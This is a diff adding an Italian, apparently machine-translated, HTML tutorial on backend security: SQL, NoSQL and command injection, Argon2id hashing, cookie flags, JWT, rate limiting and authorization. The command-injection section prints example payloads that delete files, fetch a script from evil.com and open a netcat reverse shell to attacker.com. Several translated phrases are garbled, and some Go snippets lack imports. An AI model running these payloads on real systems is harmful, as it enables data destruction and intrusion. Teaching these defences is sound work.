+                        <td><code>OR</code></td>
+                        <td>Operatore logico</td>
+                        <td>Crea una condizione sempre vera per ignorare i filtri WHERE</td>
+                    </tr>
+                    <tr>
+                        <td><code>UNION</code></td>
+                        <td>Combina i set di risultati</td>
+                        <td>Estrae dati da altre tabelle (pagamenti, segreti)</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>La soluzione: query parametrizzate</h3>
+            <p>Invece di costruire una stringa con tutto mescolato insieme, invia <strong>due cose separate</strong>
+                al database: (1) il modello di query con slot segnaposto, (2) i dati utente come argomenti separati.
+                Il driver del database garantisce che qualunque cosa entri in uno slot venga trattata come una stringa pura, mai come
+                SQL eseguibile.</p>
+
+            <pre><span class="lang-label">Go / pgx parameterised query</span><span class="cmt">//NEVER, string concatenation</span>
+query := <span class="str">"SELECT * FROM users WHERE email = '"</span> + userInput + <span class="str">"'"</span>
+
+<span class="cmt">// ALWAYS, parameterised ($1 is the slot)</span>
+row := db.QueryRow(ctx,
+    <span class="str">"SELECT id, name FROM users WHERE email = $1"</span>,
+    userInput,  <span class="cmt">// passed separately, treated purely as data</span>
+)
+
+<span class="cmt">// With an ORM (GORM), parameterised automatically</span>
+db.Where(<span class="str">"email = ?"</span>, userInput).First(&amp;user)</pre>
+
+            <div class="callout security">Ogni ORM moderno (GORM, SQLAlchemy, Prisma, Hibernate) utilizza parametrizzati
+                query per impostazione predefinita. L’unico modo per essere vulnerabili oggi è aggirarli deliberatamente con corde grezze
+                edificio. <strong>Non farlo mai.</strong></div>
+
+            <h3>Rafforzamento aggiuntivo: autorizzazioni DB minime</h3>
+            <p>Anche se un'iniezione SQL ha esito positivo, è possibile limitare il raggio dell'esplosione. L'utente del database utilizzato dal tuo backend
+                connect dovrebbe avere solo <strong>Autorizzazioni DML</strong> (INSERT, UPDATE, DELETE, SELECT), mai DDL
+                permessi (DROP TABLE, CREATE TABLE, ALTER). Un hacker che riceve SQL injection non può eliminare le tue tabelle
+                se l'utente del DB non può eseguire DDL.</p>
+
+            <h3>Iniezione NoSQL (MongoDB)</h3>
+            <p>Le query MongoDB sono oggetti JSON, non stringhe SQL. Ma sostengono <em>operatori</em> (con il prefisso
+                <code>$</code>) piace <code>$ne</code> (non uguale), <code>$gt</code>, <code>$exists</code>. Se passi
+                JSON grezzo fornito dall'utente direttamente a una query, un utente malintenzionato può inserire questi operatori:</p>
+
+            <pre><span class="lang-label">JavaScript / MongoDB Injection</span><span class="cmt">//VULNERABLE: attacker sends {"$ne": null} as email</span>
+db.users.find({ email: req.body.email })
+<span class="cmt">// Becomes: { email: { $ne: null } }  -&gt; returns ALL users</span>
+
+<span class="cmt">// FIX: validate that email is a plain string, not an object</span>
+<span class="kw">if</span> (typeof req.body.email !== <span class="str">'string'</span>) {
+  <span class="kw">return</span> res.status(<span class="num">400</span>).json({ error: <span class="str">'Invalid email'</span> })
+}
+db.users.find({ email: req.body.email })</pre>
+        </section>
+
+        <!-- 04 COMMAND INJECTION -->
+        <section id="cmd">
+            <div class="section-header"><span class="badge">04</span>
+                <h2>Iniezione di comando</h2>
+            </div>
+
+            <p>L'iniezione di comandi è l'iniezione SQL a livello di sistema operativo. A volte il tuo backend ha bisogno di chiamare esternamente
+                programmi (elaborazione immagini con FFmpeg, compressione file, generazione PDF). Se costruisci la shell
+                comando concatenando l'input dell'utente, un utente malintenzionato può iniettare comandi shell nel tuo server.</p>
+
+            <h3>L'attacco</h3>
+            <pre><span class="lang-label">Shell / Vulnerable Image Resize</span><span class="cmt"># User supplies the output filename. Attacker sends: "out.jpg; rm -rf /"</span>
+ffmpeg -i input.jpg -vf scale=800:600 <span class="num">out.jpg; rm -rf /</span>
+<span class="cmt">#                                       ^ ffmpeg done  ^ now this runs</span>
+
+<span class="cmt"># Attacker can also use:</span>
+<span class="cmt"># out.jpg && curl evil.com/malware.sh | bash    (install backdoor)</span>
+<span class="cmt"># out.jpg & nc -e /bin/sh attacker.com 4444 &   (reverse shell in background)</span></pre>
+
+            <p>Caratteri speciali della shell che consentono ciò:</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Carattere</th>
+                        <th>Significato della conchiglia</th>
+                        <th>Uso dell'attacco</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>;</code></td>
+                        <td>Comandi separati</td>
+                        <td>Esegui il secondo comando dopo il primo</td>
+                    </tr>
+                    <tr>
+                        <td><code>&&</code></td>
+                        <td>Esegui se il precedente ha avuto successo</td>
+                        <td>Exploit a catena dopo comando legittimo</td>
+                    </tr>
+                    <tr>
+                        <td><code>|</code></td>
+                        <td>Uscita del tubo</td>
+                        <td>Invia l'output al comando distruttivo</td>
+                    </tr>
+                    <tr>
+                        <td><code>&</code></td>
+                        <td>Esegui in background</td>
+                        <td>Installa spyware persistente in modo silenzioso</td>
+                    </tr>
+                    <tr>
+                        <td><code>$()</code></td>
+                        <td>Sostituzione dei comandi</td>
+                        <td>Esegui un comando arbitrario in linea</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>La soluzione: comando separato dagli argomenti</h3>
+            <p>Ogni linguaggio fornisce funzioni che accettano il file <em>comando</em> e <em>argomenti</em> come separato
+                parametri. Questi passano gli argomenti direttamente al processo senza passare attraverso un interprete di shell, quindi
+                i caratteri speciali non vengono mai interpretati.</p>
+
+            <pre><span class="lang-label">Go / exec.Command (safe)</span><span class="kw">import</span> <span class="str">"os/exec"</span>
+
+<span class="cmt">//VULNERABLE, passes through shell interpreter</span>
+cmd := exec.Command(<span class="str">"sh"</span>, <span class="str">"-c"</span>, <span class="str">"ffmpeg -i input.jpg -o "</span>+userFilename)
+
+<span class="cmt">// SAFE, command and each argument are separate params</span>
+<span class="cmt">// Shell never sees userFilename, it goes straight to the process</span>
+cmd := exec.Command(
+    <span class="str">"ffmpeg"</span>,
+    <span class="str">"-i"</span>, <span class="str">"input.jpg"</span>,
+    <span class="str">"-vf"</span>, <span class="str">"scale=800:600"</span>,
+    userFilename,   <span class="cmt">// treated as a string argument, not shell code</span>
+)
+output, err := cmd.Output()</pre>
+
+            <pre><span class="lang-label">Python / subprocess (safe)</span><span class="kw">import</span> subprocess
+
+<span class="cmt">#VULNERABLE, shell=True sends everything through sh</span>
+subprocess.run(<span class="str">f"ffmpeg -i input.jpg -o {user_filename}"</span>, shell=<span class="kw">True</span>)
+
+<span class="cmt"># SAFE, list form, shell=False (default)</span>
+subprocess.run([
+    <span class="str">"ffmpeg"</span>, <span class="str">"-i"</span>, <span class="str">"input.jpg"</span>,
+    <span class="str">"-vf"</span>, <span class="str">"scale=800:600"</span>,
+    user_filename   <span class="cmt"># just a string, not interpreted</span>
+], check=<span class="kw">True</span>)</pre>
+
+            <div class="callout warning">La regola: <strong>non passare mai l'input dell'utente in un file interpretato dalla shell
+                    stringa.</strong> Ogni volta che stai costruendo una stringa che verrà eseguita da un altro sistema e it
+                include l'input dell'utente, arresta e trova l'alternativa parametrizzata. Esiste quasi sempre.</div>
+        </section>
+
+        <!-- 05 PASSWORD STORAGE -->
+        <section id="passwords">
+            <div class="section-header"><span class="badge">05</span>
+                <h2>Archiviazione delle password: le tre evoluzioni</h2>
+            </div>
+
+            <p>I database vengono violati ogni giorno. In tal caso, il modo in cui hai memorizzato le password determina se i tuoi utenti
+                le vite vengono distrutte o no.</p>
+
+            <div class="diagram-box">
+                <svg viewBox="0 0 700 160" xmlns="http://www.w3.org/2000/svg" width="100%">
+                    <rect width="700" height="160" fill="#fff" />
+                    <!-- Step 1 -->
+                    <rect x="20" y="30" width="180" height="100" rx="8" fill="#f4ded6" stroke="#b8402e" />
+                    <text x="110" y="56" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">(1) Testo semplice</text>
+                    <text x="110" y="76" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="11">pass_col = &quot;12345&quot;</text>
+                    <text x="110" y="96" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Breccia -&gt; Pwn istantaneo</text>
+                    <text x="110" y="114" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Gli sviluppatori possono vedere tutte le password</text>
+                    <!-- Step 2 -->
+                    <rect x="220" y="30" width="180" height="100" rx="8" fill="#f0e5c9" stroke="#b07d2b" />
+                    <text x="310" y="56" text-anchor="middle" fill="#b07d2b" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">(2) Solo hashing </text>
+                    <text x="310" y="76" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="11">SHA256(&quot;12345&quot;)</text>
+                    <text x="310" y="96" text-anchor="middle" fill="#b07d2b" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Vulnerabile all'arcobaleno</text>
+                    <text x="310" y="114" text-anchor="middle" fill="#b07d2b" font-family="Source Sans 3,sans-serif"
+                        font-size="10">attacchi al tavolo</text>
+                    <!-- Step 3 -->
+                    <rect x="420" y="30" width="260" height="100" rx="8" fill="#e0e9dd" stroke="#3f6f4e" />
+                    <text x="550" y="56" text-anchor="middle" fill="#3f6f4e" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">(3) Hashish lento + sale </text>
+                    <text x="550" y="76" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="10">argon2id(&quot;12345&quot; + salt_u14)</text>
+                    <text x="550" y="96" text-anchor="middle" fill="#3f6f4e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Tavoli arcobaleno inutili</text>
+                    <text x="550" y="114" text-anchor="middle" fill="#3f6f4e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Forza bruta: secoli, non giorni</text>
+                </svg>
+                <div class="diagram-caption">Fig 3: Evoluzione della memorizzazione delle password. Solo l'opzione (3) è accettabile
+                    produzione.</div>
+            </div>
+
+            <h3>Perché il testo normale fallisce</h3>
+            <p>Ogni violazione del database espone immediatamente tutte le password. Peggio ancora: oltre il 70% degli utenti riutilizza le password su tutta la rete
+                siti, quindi una violazione consegna agli aggressori le chiavi di account di posta elettronica, bancari e di social media che non avevano
+                anche bersaglio.</p>
+
+            <h3>Perché l'hashing da solo non è sufficiente</h3>
+            <p>Gli aggressori effettuano il precalcolo <strong>tavoli arcobaleno</strong>: enormi tabelle di ricerca che mappano le password comuni
+                (come &quot;123456&quot;, &quot;password&quot;, &quot;qwerty&quot;) ai loro hash. Se il tuo hash corrisponde a una voce della tabella arcobaleno, loro
+                ricerca inversa immediatamente il testo in chiaro. Una GPU può calcolare <em>miliardi di hash SHA-256 per
+                    secondo</em>.</p>
+
+            <h3>Salatura: sconfiggere le tavole arcobaleno</h3>
+            <p>A <strong>sale</strong> è una stringa crittograficamente casuale generata in modo univoco per ciascun utente. Tu
+                concatenare il salt con la password prima dell'hashing. Poiché il sale di ogni utente è diverso, anche due
+                gli utenti con la stessa password producono hash completamente diversi. I tavoli arcobaleno diventerebbero inutili
+                è necessaria una nuova tabella per utente.</p>
+
+            <h3>Hashing lento: sconfiggere la forza bruta</h3>
+            <p>Le funzioni hash generiche (SHA-256, MD5) sono progettate per essere <em>veloce</em>. Una GPU può fare miliardi al giorno
+                secondo. Algoritmi di hashing della password (bcrypt, scrypt, <strong>Argon2id</strong>) sono deliberatamente
+                <em>lento</em> tramite un configurabile <strong>fattore costo/lavoro</strong>. A 400 ms per hash:</p>
+            <ul>
+                <li>Accesso utente legittimo: 400 ms, impercettibile, assolutamente soddisfacente.</li>
+                <li>Forza bruta dell'aggressore offline: 400 ms per tentativo -&gt; ~2,5 tentativi/secondo invece di miliardi -&gt;
+                    ci vuole il cracking <em>secoli</em>.</li>
+            </ul>
+
+            <div class="callout tip"><strong>Standard del settore oggi:</strong> utilizzare <code>Argon2id</code> (vincitore del
+                Concorso di hashing delle password). Fallback: bcrypt con fattore di costo &gt;=12. Non utilizzare mai SHA-256, MD5 o SHA-1
+                per le password.</div>
+
+            <pre><span class="lang-label">Go / Argon2id (golang.org/x/crypto)</span><span class="kw">import</span> (
+    <span class="str">"crypto/rand"</span>
+    <span class="str">"golang.org/x/crypto/argon2"</span>
+    <span class="str">"encoding/base64"</span>
+)
+
+<span class="kw">func</span> <span class="fn">HashPassword</span>(password <span class="type">string</span>) (<span class="type">string</span>, <span class="type">error</span>) {
+    <span class="cmt">// Generate cryptographically random 16-byte salt</span>
+    salt := <span class="kw">make</span>([]<span class="type">byte</span>, <span class="num">16</span>)
+    rand.Read(salt)
+
+    <span class="cmt">// Argon2id params: time=1, memory=64MB, threads=4, keyLen=32</span>
+    hash := argon2.IDKey([]<span class="type">byte</span>(password), salt, <span class="num">1</span>, <span class="num">64</span>*<span class="num">1024</span>, <span class="num">4</span>, <span class="num">32</span>)
+
+    <span class="cmt">// Store: $argon2id$salt$hash (both needed to verify)</span>
+    encoded := base64.RawStdEncoding.EncodeToString(salt) +
+               <span class="str">"$"</span> + base64.RawStdEncoding.EncodeToString(hash)
+    <span class="kw">return</span> encoded, nil
+}
+
+<span class="kw">func</span> <span class="fn">VerifyPassword</span>(password, stored <span class="type">string</span>) <span class="type">bool</span> {
+    <span class="cmt">// Re-hash with stored salt, compare, never compare raw hashes with ==</span>
+    parts := strings.Split(stored, <span class="str">"$"</span>)
+    salt, _ := base64.RawStdEncoding.DecodeString(parts[<span class="num">0</span>])
+    newHash := argon2.IDKey([]<span class="type">byte</span>(password), salt, <span class="num">1</span>, <span class="num">64</span>*<span class="num">1024</span>, <span class="num">4</span>, <span class="num">32</span>)
+    <span class="kw">return</span> subtle.ConstantTimeCompare(newHash,
+        mustDecode(parts[<span class="num">1</span>])) == <span class="num">1</span>
+}</pre>
+        </section>
+
+        <!-- 06 SESSIONS -->
+        <section id="sessions">
+            <div class="section-header"><span class="badge">06</span>
+                <h2>Sessioni, cookie e flag critici</h2>
+            </div>
+
+            <p>Dopo che un utente si è autenticato, è necessario ricordarlo tra le richieste. Ciò avviene tramite a
+                <strong>sessione</strong>: un identificatore casuale memorizzato lato server, collegato ai dati dell'utente, inviato al
+                browser come un cookie.</p>
+
+            <h3>Il flusso della sessione</h3>
+            <ol>
+                <li>L'utente invia e-mail + password.</li>
+                <li>Il server verifica la password (corrispondenza hash argon2id).</li>
+                <li>Il server genera un file <strong>crittograficamente casuale</strong> ID sessione 128-256 bit.</li>
+                <li>Il server memorizza l'ID di sessione in Redis/DB con i metadati dell'utente (ID utente, IP, agente utente, scadenza,
+                    creato_a).</li>
+                <li>Il server invia l'ID di sessione al browser in un cookie con rigorosi flag di sicurezza.</li>
+                <li>Ogni richiesta successiva: il browser invia il cookie -&gt; il server cerca l'ID di sessione -&gt; identifica l'utente.</li>
+            </ol>
+
+            <h3>I tre flag di cookie critici</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Bandiera</th>
+                        <th>Valore</th>
+                        <th>Cosa fa</th>
+                        <th>Senza di esso</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>HttpOnly</strong></td>
+                        <td><code>true</code></td>
+                        <td>JS non può leggere questo cookie</td>
+                        <td>XSS ruba l'ID di sessione tramite <code>document.cookie</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Sicuro</strong></td>
+                        <td><code>true</code></td>
+                        <td>Cookie inviato solo tramite HTTPS</td>
+                        <td>Sessione rubata da un intercettatore Wi-Fi o da Wireshark</td>
+                    </tr>
+                    <tr>
+                        <td><strong>StessoSito</strong></td>
+                        <td><code>Strict</code> o <code>Lax</code></td>
+                        <td>Cookie non inviato nelle richieste multiorigine</td>
+                        <td>Gli attacchi CSRF possono utilizzare il tuo cookie da evil.com</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <pre><span class="lang-label">Go / Secure Cookie</span>http.SetCookie(w, &amp;http.Cookie{
+    Name:     <span class="str">"session_id"</span>,
+    Value:    sessionID,
+    HttpOnly: <span class="kw">true</span>,          <span class="cmt">// JS cannot access</span>
+    Secure:   <span class="kw">true</span>,           <span class="cmt">// HTTPS only</span>
+    SameSite: http.SameSiteStrictMode,  <span class="cmt">// no cross-site</span>
+    MaxAge:   <span class="num">7</span> * <span class="num">24</span> * <span class="num">3600</span>, <span class="cmt">// 7 days</span>
+    Path:     <span class="str">"/"</span>,
+})</pre>
+
+            <div class="callout security"><strong>Non archiviare mai gli ID di sessione o i token JWT in localStorage.</strong>
+                LocalStorage è accessibile da qualsiasi JavaScript nella pagina. Una vulnerabilità XSS = tutte le sessioni rubate.
+                Usalo sempre <code>HttpOnly</code> biscotti.</div>
+        </section>
+
+        <!-- 07 JWT -->
+        <section id="jwt">
+            <div class="section-header"><span class="badge">07</span>
+                <h2>JWT: autenticazione senza stato</h2>
+            </div>
+
+            <p>Un JWT (JSON Web Token) è un'alternativa alle sessioni lato server. Invece di memorizzare i dati della sessione nel file
+                DB e inviando solo un ID al client, il JWT <em>contiene</em> i dati della sessione, firmati
+                crittograficamente in modo che non possa essere manomesso.</p>
+
+            <h3>Struttura JWT</h3>
+            <div class="diagram-box">
+                <svg viewBox="0 0 680 100" xmlns="http://www.w3.org/2000/svg" width="100%">
+                    <rect width="680" height="100" fill="#fff" />
+                    <rect x="20" y="30" width="160" height="40" rx="6" fill="#3f6f4e" opacity=".85" />
+                    <text x="100" y="48" text-anchor="middle" fill="#fff" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Intestazione</text>
+                    <text x="100" y="63" text-anchor="middle" fill="#d5f5e3" font-family="JetBrains Mono,monospace"
+                        font-size="10">alg: HS256, tipo: JWT</text>
+                    <text x="193" y="52" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="14">.</text>
+                    <rect x="200" y="30" width="260" height="40" rx="6" fill="#37607f" opacity=".85" />
+                    <text x="330" y="48" text-anchor="middle" fill="#fff" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Carico utile (reclami)</text>
+                    <text x="330" y="63" text-anchor="middle" fill="#d6eaf8" font-family="JetBrains Mono,monospace"
+                        font-size="10">sub: user_id, iat, exp, ruolo: &quot;admin&quot;</text>
+                    <text x="463" y="52" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="14">.</text>
+                    <rect x="470" y="30" width="190" height="40" rx="6" fill="#37607f" opacity=".85" />
+                    <text x="565" y="48" text-anchor="middle" fill="#fff" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Firma</text>
+                    <text x="565" y="63" text-anchor="middle" fill="#f5eeff" font-family="JetBrains Mono,monospace"
+                        font-size="10">HMAC(intestazione+carico utile, segreto)</text>
+                </svg>
+                <div class="diagram-caption">Fig 4: JWT: tre parti con codifica Base64 unite da punti. Il carico utile è
+                    leggibile, ma a prova di manomissione tramite firma.</div>
+            </div>
+
+            <div class="callout warning"><strong>Il payload NON è crittografato, ma solo firmato.</strong> Lo è
+                Codificato Base64, che chiunque può decodificare. Non archiviare mai dati sensibili (password, PII, carta di credito
+                numeri) nelle affermazioni JWT. Memorizza solo ciò di cui il server ha bisogno (ID utente, ruolo) e ciò che è sicuro se esposto.
+            </div>
+
+            <h3>JWT vs Sessioni: quando utilizzare quale</h3>
+            <div class="compare-grid">
+                <div class="compare-card">
+                    <h4>Sessioni (con stato) preferite</h4>
+                    <ul>
+                        <li>Revoca istantanea, elimina la riga della sessione</li>
+                        <li>Nessun dato esposto al cliente</li>
+                        <li>Architettura più semplice per la maggior parte dei SaaS</li>
+                        <li>Scalabile con Redis (archivio sessioni condivise)</li>
+                        <li>Consigliato dalla maggior parte degli esperti di sicurezza</li>
+                    </ul>
+                </div>
+                <div class="compare-card">
+                    <h4>JWT (senza stato)</h4>
+                    <ul>
+                        <li>Nessuna ricerca DB per richiesta (più veloce su larga scala)</li>
+                        <li>La revoca è difficile, è necessaria una lista nera o una scadenza breve</li>
+                        <li>Se l'account è compromesso, non è possibile forzare la disconnessione immediata</li>
+                        <li>Soluzioni alternative: scadenza breve (5-10 minuti) + token di aggiornamento</li>
+                        <li>Utilizzare solo se l'assenza di stato è un requisito difficile</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Se è necessario utilizzare JWT: migliori pratiche</h3>
+            <ul>
+                <li><strong>Scadenza breve del token di accesso</strong>: 5-15 minuti. I token di lunga durata sono token rubati
+                    non scadono mai.</li>
+                <li><strong>Aggiorna la rotazione dei token</strong>: emette una nuova coppia di token di accesso + aggiornamento ad ogni aggiornamento.
+                    Memorizzato lato server.</li>
+                <li><strong>Memorizzazione dei cookie solo Http</strong>: non localStorage. XSS non può rubare ciò che JS non può leggere.
+                </li>
+                <li><strong>Segreto forte</strong>: &gt;=Segreto casuale a 256 bit per la firma HMAC. Ruotalo periodicamente.
+                </li>
+                <li><strong>Verifica su ogni richiesta</strong>: non fidarti di un JWT solo perché è ben formato. Sempre
+                    verificare la firma.</li>
+            </ul>
+        </section>
+
+        <!-- 08 RATE LIMITING -->
+        <section id="ratelimit">
+            <div class="section-header"><span class="badge">08</span>
+                <h2>Endpoint di autenticazione con limitazione della velocità</h2>
+            </div>
+
+            <p>Senza limitazione della velocità, un utente malintenzionato può inviare milioni di tentativi di accesso al secondo, sia con la forza bruta
+                password o per disattivare il server (DoS). La limitazione della velocità lo è <strong>obbligatorio</strong> su tutte le aut
+                endpoint.</p>
+
+            <h3>Tre livelli di limitazione della velocità</h3>
+            <div class="diagram-box">
+                <svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" width="100%">
+                    <rect width="680" height="200" fill="#fff" />
+                    <defs>
+                        <marker id="rl" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#5b5347" />
+                        </marker>
+                    </defs>
+                    <!-- Layer 1 -->
+                    <rect x="20" y="30" width="180" height="70" rx="8" fill="#ece3d4" stroke="#d8cfbe" />
+                    <text x="110" y="55" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Livello 1: per IP</text>
+                    <text x="110" y="73" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="11">10 tentativi/minuto</text>
+                    <text x="110" y="89" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Bypassato da botnet/IP rotanti</text>
+                    <line x1="202" y1="65" x2="238" y2="65" stroke="#5b5347" stroke-width="1.5" marker-end="url(#rl)" />
+                    <!-- Layer 2 -->
+                    <rect x="240" y="30" width="200" height="70" rx="8" fill="#ece3d4" stroke="#d8cfbe" />
+                    <text x="340" y="55" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Livello 2: per account</text>
+                    <text x="340" y="73" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="11">5 fallimenti -&gt; blocco 24 ore</text>
+                    <text x="340" y="89" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Bypassato dallo spray per password</text>
+                    <line x1="442" y1="65" x2="478" y2="65" stroke="#5b5347" stroke-width="1.5" marker-end="url(#rl)" />
+                    <!-- Layer 3 -->
+                    <rect x="480" y="30" width="180" height="70" rx="8" fill="#eafaf1" stroke="#3f6f4e" />
+                    <text x="570" y="55" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Livello 3: globale</text>
+                    <text x="570" y="73" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="11">100 guasti/min in tutto il sistema</text>
+                    <text x="570" y="89" text-anchor="middle" fill="#3f6f4e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Avviso + CAPTCHA per tutti gli utenti</text>
+                    <!-- Password spray note -->
+                    <rect x="20" y="130" width="640" height="46" rx="8" fill="#f0e5c9" stroke="#b07d2b" />
+                    <text x="340" y="152" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Attacco spray password</text>
+                    <text x="340" y="168" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="11">Prova una password comune (&quot;123456&quot;) su milioni di account -&gt; evita
+                        blocco per account. Solo la limitazione della velocità globale rileva questo problema.</text>
+                </svg>
+                <div class="diagram-caption">Fig 5: Limitazione della velocità a tre livelli: ogni livello rileva gli attacchi che vengono aggirati
+                    quello precedente.</div>
+            </div>
+
+            <pre><span class="lang-label">Go / Rate Limiting with golang.org/x/time/rate</span><span class="kw">import</span> (
+    <span class="str">"golang.org/x/time/rate"</span>
+    <span class="str">"sync"</span>
+    <span class="str">"net/http"</span>
+)
+
+<span class="kw">var</span> (
+    mu       sync.Mutex
+    limiters = <span class="kw">map</span>[<span class="type">string</span>]*rate.Limiter{}
+)
+
+<span class="cmt">// Per-IP limiter: 5 requests per second, burst of 10</span>
+<span class="kw">func</span> <span class="fn">getIPLimiter</span>(ip <span class="type">string</span>) *rate.Limiter {
+    mu.Lock()
+    <span class="kw">defer</span> mu.Unlock()
+    l, ok := limiters[ip]
+    <span class="kw">if</span> !ok {
+        l = rate.NewLimiter(<span class="num">5</span>, <span class="num">10</span>)
+        limiters[ip] = l
+    }
+    <span class="kw">return</span> l
+}
+
+<span class="kw">func</span> <span class="fn">RateLimitMiddleware</span>(next http.Handler) http.Handler {
+    <span class="kw">return</span> http.HandlerFunc(<span class="kw">func</span>(w http.ResponseWriter, r *http.Request) {
+        ip := r.RemoteAddr
+        <span class="kw">if</span> !<span class="fn">getIPLimiter</span>(ip).Allow() {
+            http.Error(w, <span class="str">"too many requests"</span>, http.StatusTooManyRequests)
+            <span class="kw">return</span>
+        }
+        next.ServeHTTP(w, r)
+    })
+}</pre>
+        </section>
+
+        <!-- 09 AUTHORIZATION -->
+        <section id="authz">
+            <div class="section-header"><span class="badge">09</span>
+                <h2>Vulnerabilità dell'autorizzazione: BOLA e BFLA</h2>
+            </div>
+
+            <blockquote>&quot;L'autenticazione ti dice chi è l'utente. L'autorizzazione ti dice cosa gli è consentito fare.
+                La maggior parte degli ingegneri interpreta correttamente l'autenticazione e sbaglia l'autorizzazione.&quot;</blockquote>
+
+            <h3>L'errore fondamentale</h3>
+            <p>L'autorizzazione viene controllata a livello di routing (middleware). Gli ingegneri quindi presuppongono: <em>&quot;l'utente è passato
+                    auth, in modo che possano accedere a qualsiasi cosa da qui.&quot;</em> Ciò crea un pericoloso falso senso di sicurezza.
+            </p>
+
+            <div class="diagram-box">
+                <svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg" width="100%">
+                    <rect width="680" height="220" fill="#fff" />
+                    <defs>
+                        <marker id="az" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#5b5347" />
+                        </marker>
+                        <marker id="azr" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#b8402e" />
+                        </marker>
+                        <marker id="azg" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#3f6f4e" />
+                        </marker>
+                    </defs>
+                    <!-- Layers -->
+                    <rect x="20" y="60" width="100" height="40" rx="6" fill="#ece3d4" stroke="#d8cfbe" />
+                    <text x="70" y="85" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="11">Router</text>
+                    <line x1="122" y1="80" x2="148" y2="80" stroke="#5b5347" stroke-width="1.5" marker-end="url(#az)" />
+
+                    <rect x="150" y="50" width="110" height="60" rx="6" fill="#ece3d4" stroke="#d8cfbe" />
+                    <text x="205" y="75" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Middleware di autenticazione</text>
+                    <text x="205" y="92" text-anchor="middle" fill="#3f6f4e" font-family="JetBrains Mono,monospace"
+                        font-size="10">autenticato</text>
+                    <line x1="262" y1="80" x2="288" y2="80" stroke="#5b5347" stroke-width="1.5" marker-end="url(#az)" />
+
+                    <rect x="290" y="60" width="90" height="40" rx="6" fill="#ece3d4" stroke="#d8cfbe" />
+                    <text x="335" y="85" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="11">Gestore</text>
+                    <line x1="382" y1="80" x2="408" y2="80" stroke="#5b5347" stroke-width="1.5" marker-end="url(#az)" />
+
+                    <rect x="410" y="60" width="90" height="40" rx="6" fill="#ece3d4" stroke="#d8cfbe" />
+                    <text x="455" y="85" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="11">Servizio</text>
+                    <line x1="502" y1="80" x2="528" y2="80" stroke="#5b5347" stroke-width="1.5" marker-end="url(#az)" />
+
+                    <rect x="530" y="60" width="120" height="40" rx="6" fill="#f4ded6" stroke="#b8402e" />
+                    <text x="590" y="82" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Deposito &lt;-</text>
+                    <text x="590" y="95" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="9">SELECT * DOVE id=5</text>
+
+                    <!-- Bad label -->
+                    <text x="590" y="135" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">VULNERABILE</text>
+                    <text x="590" y="150" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Nessun controllo della proprietà dell'utente</text>
+                    <text x="590" y="165" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
